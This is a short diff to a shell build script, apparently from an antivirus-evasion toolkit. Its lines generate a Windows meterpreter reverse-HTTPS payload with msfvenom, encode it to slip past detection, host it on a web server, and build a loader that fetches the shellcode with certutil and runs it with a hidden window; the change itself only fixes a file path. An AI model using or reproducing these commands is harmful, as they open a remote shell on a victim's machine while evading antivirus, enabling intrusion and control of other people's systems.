@@ -8,7 +8,7 @@
 # additionaly to the avet encoder, further encoding should be used
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > thepayload.bin
 # copy file to standart web server dir
-cp thepayload /var/html/www
+cp thepayload.bin /var/www/html
 # call make_avet, the -l stands for loading and exec shellcode from given file 
 # -d certutil downloads the file from a url, -q hides window
 ./make_avet -l -d certutil -q 
